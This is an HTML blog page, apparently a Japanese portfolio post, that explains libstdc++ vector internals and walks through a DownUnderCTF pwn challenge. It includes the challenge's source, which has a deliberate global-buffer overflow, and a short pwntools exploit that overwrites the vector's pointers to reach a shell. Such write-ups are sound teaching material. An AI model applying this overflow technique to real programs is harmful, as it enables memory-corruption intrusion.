@@ -1,0 +1,87 @@
+<!DOCTYPE html SYSTEM "about:legacy-compat">
+<html lang="en-US" data-preset="contrast" data-primary-color="#307FFF"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="UTF-8"><meta name="robots" content="noindex"><meta name="built-on" content="2024-07-19T13:49:25.220954962"><title>C++,ベクトル型の実装仕様とMemory Allocation | portfolio</title><script type="application/json" id="virtual-toc-data">[{"id":"i89au7s_3148","level":0,"title":"仕様","anchor":"#i89au7s_3148"},{"id":"m-finish-m-end-of-storage","level":0,"title":"コード内の_M_finishや_M_end_of_storageとは","anchor":"#m-finish-m-end-of-storage"},{"id":"bss","level":0,"title":".bssのオーバーライト","anchor":"#bss"}]</script><script type="application/json" id="topic-shortcuts"></script><link href="https://resources.jetbrains.com/writerside/apidoc/6.10.0-b267/app.css" rel="stylesheet"><meta name="msapplication-TileColor" content="#000000"><link rel="apple-touch-icon" sizes="180x180" href="https://jetbrains.com/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="https://jetbrains.com/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="https://jetbrains.com/favicon-16x16.png"><meta name="msapplication-TileImage" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-144x144.png"><meta name="msapplication-square70x70logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-70x70.png"><meta name="msapplication-square150x150logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-150x150.png"><meta name="msapplication-wide310x150logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-310x150.png"><meta name="msapplication-square310x310logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-310x310.png"><meta name="image" content=""><!-- Open Graph --><meta property="og:title" content="C++,ベクトル型の実装仕様とMemory Allocation | portfolio"><meta property="og:description" content=""><meta property="og:image" content=""><meta property="og:site_name" content="portfolio Help"><meta property="og:type" content="website"><meta property="og:locale" content="en_US"><meta property="og:url" content="writerside-documentation/cppvectorspecification.html"><!-- End Open Graph --><!-- Twitter Card --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content=""><meta name="twitter:title" content="C++,ベクトル型の実装仕様とMemory Allocation | portfolio"><meta name="twitter:description" content=""><meta name="twitter:creator" content=""><meta name="twitter:image:src" content=""><!-- End Twitter Card --><!-- Schema.org WebPage --><script type="application/ld+json">{
+    "@context": "http://schema.org",
+    "@type": "WebPage",
+    "@id": "writerside-documentation/cppvectorspecification.html#webpage",
+    "url": "writerside-documentation/cppvectorspecification.html",
+    "name": "C++,ベクトル型の実装仕様とMemory Allocation | portfolio",
+    "description": "",
+    "image": "",
+    "inLanguage":"en-US"
+}</script><!-- End Schema.org --><!-- Schema.org WebSite --><script type="application/ld+json">{
+    "@type": "WebSite",
+    "@id": "writerside-documentation/#website",
+    "url": "writerside-documentation/",
+    "name": "portfolio Help"
+}</script><!-- End Schema.org --></head><body data-id="CppVectorSpecification" data-main-title="C++,ベクトル型の実装仕様とMemory Allocation" data-article-props="{&quot;seeAlsoStyle&quot;:&quot;links&quot;}" data-template="article" data-breadcrumbs="Blog.md|Blog"><div class="wrapper"><main class="panel _main"><header class="panel__header"><div class="container"><h3>portfolio  Help</h3><div class="panel-trigger"></div></div></header><section class="panel__content"><div class="container"><article class="article" data-shortcut-switcher="inactive"><h1 data-toc="CppVectorSpecification" id="CppVectorSpecification.md">C++,ベクトル型の実装仕様とMemory Allocation</h1><p id="i89au7s_3147">今回は先日のDownUnderCTFで出たC++,Vector型のpwn問で知ったVector型の仕様,メモリアロケーションについてのブログです.</p><section class="chapter"><h2 id="i89au7s_3148" data-toc="i89au7s_3148">仕様</h2><p id="i89au7s_3149">Vector型の仕様はとても単純です.</p><p id="i89au7s_3150">Vector型は可変長の配列として認識されているところがありますが,その実態は2\^nの領域をヒープ領域に確保し,足りない場合2\^(n+1)のメモリをヒープ領域にアロケーションしもとのデータをコピーし開放しているだけです.</p><p id="i89au7s_3151">この実装仕様はgcc,libstdc++のstl_vector.h(<a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc++-v3/include/bits/stl_vector.h" id="i89au7s_3152" data-external="true" rel="noopener noreferrer">github</a>もしくは/usr/include/c++/version/bits/stl_vector.h)で確認できます.</p><p id="i89au7s_3153">要素を末尾に追加するpush_back()はこのようになっています.</p><div class="code-block" data-lang="c">
+void
+push_back(const value_type&amp; __x){
+    if (this-&gt;_M_impl._M_finish != this-&gt;_M_impl._M_end_of_storage)
+    {
+  _GLIBCXX_ASAN_ANNOTATE_GROW(1);
+  _Alloc_traits::construct(this-&gt;_M_impl, this-&gt;_M_impl._M_finish,__x);
+  ++this-&gt;_M_impl._M_finish;
+  _GLIBCXX_ASAN_ANNOTATE_GREW(1);
+  }
+  else
+  _M_realloc_append(__x);
+}
+</div></section><section class="chapter"><h2 id="m-finish-m-end-of-storage" data-toc="m-finish-m-end-of-storage">コード内の_M_finishや_M_end_of_storageとは</h2><p id="i89au7s_3155">コード内の_M_finish,_M_end_of_storage,_M_start(後述)はヒープ領域ではなく.bssセクションに記憶されるデータです.</p><ul class="list _bullet" id="i89au7s_3156"><li class="list__item" id="i89au7s_3157"><p>_M_start </p><ul class="list _bullet" id="i89au7s_3158"><li class="list__item" id="i89au7s_3159"><p>このポインタはvector型がヒープ領域に確保している範囲の最初を指しています</p></li></ul></li><li class="list__item" id="i89au7s_3160"><p>_M_finish </p><ul class="list _bullet" id="i89au7s_3161"><li class="list__item" id="i89au7s_3162"><p>このポインタはvector型の最後の要素の次の要素の位置を指しています</p></li></ul></li><li class="list__item" id="i89au7s_3163"><p>_M_end_of_storage </p><ul class="list _bullet" id="i89au7s_3164"><li class="list__item" id="i89au7s_3165"><p>このポインタはvector型がヒープ領域に確保している範囲の終わりを指しています</p></li></ul></li></ul><aside class="prompt" data-type="tip" data-title="" id="i89au7s_3166"><p id="i89au7s_3167">.bssセクションとはプログラムのグローバル変数等を記憶するセクションです.</p><p id="i89au7s_3168">他のプログラムのセクションとしては定数を記憶する.dataセクションやstack,heapもセクションの一部です</p></aside><p id="i89au7s_3169">vector型ではこの変数に確保した_M_startのみならず_M_finishを記憶することでの高速に要素を追加することが出来るようになっています.</p><p id="i89au7s_3170">ヒープに確保した領域が足りなくなった場合2倍の領域を確保し要素をコピーしなければならないのでこの操作にはo(n)の時間がかかりますがこの再確保の頻度は指数関数的に減少します.</p></section><section class="chapter"><h2 id="bss" data-toc="bss">.bssのオーバーライト</h2><p id="i89au7s_3171">7/6~7/7に開催された<a href="https://downunderctf.com/" id="i89au7s_3172" data-external="true" rel="noopener noreferrer">Down Under CTF</a>のpwn問題でこのような問題がありました.</p><div class="code-block" data-lang="cpp">
+#include &lt;cstdlib&gt;
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;vector&gt;
+
+char buf[16];
+std::vector&lt;char&gt; v = {'X', 'X', 'X', 'X', 'X'};
+
+void lose() {
+    puts(&quot;Bye!&quot;);
+    exit(1);
+}
+
+void win() {
+    system(&quot;/bin/sh&quot;);
+    exit(0);
+}
+
+int main() {
+    char ductf[6] = &quot;DUCTF&quot;;
+    char* d = ductf;
+
+    std::cin &gt;&gt; buf;
+    if(v.size() == 5) {
+        for(auto &amp;c : v) {
+            if(c != *d++) {
+                lose();
+            }
+        }
+
+        win();
+    }
+
+    lose();
+}
+</div><p id="i89au7s_3174">vector型vの中身をDUCTFに書き換えればwin()をコールしシェルをゲット出来る問題です.</p><div class="code-block" data-lang="cpp">
+ctd::cin &gt;&gt; buf
+</div><p id="i89au7s_3176">この部分に自明なBOFがあり,bufはグローバルなので.bssセクションに確保されています.</p><figure id="i89au7s_3177"><img alt="Screenshot_20240719_125717.png" src="images/vector_ninja.png" title="Screenshot_20240719_125717.png" width="2050" height="1164"></figure><p id="i89au7s_3178">よって</p><div class="code-block" data-lang="cpp">
+DUCTF+パディング+_M_start+_M_finish+_M_end_of_storage_
+
+_M_start : bufの先頭
+_M_finish : bufのインデックス5
+_M_end_of_storage : bufのインデックス5
+</div><p id="i89au7s_3180">とすれば</p><div class="code-block" data-lang="cpp">
+for(auto &amp;c : v) {
+  if(c != *d++) {
+    lose();
+  }
+}
+</div><p id="i89au7s_3182">は私の入力を参照しますから突破出来ます.</p><div class="code-block" data-lang="python">
+from pwn import *
+
+p = process(&quot;vector_of&quot;)
+
+p.sendline(b&quot;DUCTF&quot;+b&quot;a&quot;*11 + p64(0x4051e0) + p64(0x4051e5) + p64(0x4051e5))
+
+p.interactive()
+</div><p id="i89au7s_3184">exploit自体はとても簡単でしたがvector型の仕様を完璧に理解することが出来ました. チャレンジはPIE無効でしたがPIE有効でもアドレスリークさえできれば色々応用が効きそうですね.</p></section><div class="last-modified">Last modified: 19 7月 2024</div><div data-feedback-placeholder="true"></div><div class="navigation-links _bottom"><a href="no-emacs.html" class="navigation-links__prev">Emacs Command</a><a href="firstarticle.html" class="navigation-links__next">FirstArticle</a></div></article><div id="disqus_thread"></div></div></section></main></div><script src="https://resources.jetbrains.com/writerside/apidoc/6.10.0-b267/app.js"></script></body></html>
